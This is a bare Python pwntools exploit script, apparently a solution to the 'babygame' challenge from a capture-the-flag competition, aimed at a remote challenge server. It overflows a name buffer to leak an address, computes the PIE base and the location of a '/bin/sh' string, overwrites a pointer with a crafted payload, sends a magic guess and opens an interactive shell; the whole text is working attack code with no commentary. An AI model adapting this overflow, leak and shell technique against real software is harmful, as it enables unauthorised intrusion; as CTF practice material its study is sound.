from pwn import *
#p=process('./babygame')
p=remote('pwn-2021.duc.tf',31907)
#raw_input("DEBUG")
p.sendafter("Welcome, what is your name?\n","a"*31+"b")

p.sendafter("> ","2")
p.recvuntil("ab")
number = u64(p.recv(6).ljust(0x8, b'\x00'))
log.info("number: " + hex(number))
pie = number - 0x2024
log.info("pie: " + hex(pie))
bin_sh = pie + 0x20a3
log.info("bin_sh: "+hex(bin_sh))

p.sendafter("> ","1")
payload = "a"*32
payload += p64(bin_sh)
p.sendafter("to?\n",payload)

p.sendafter("> ","1337")
p.sendafter("> guess: ",str(0x464c457f))

p.interactive()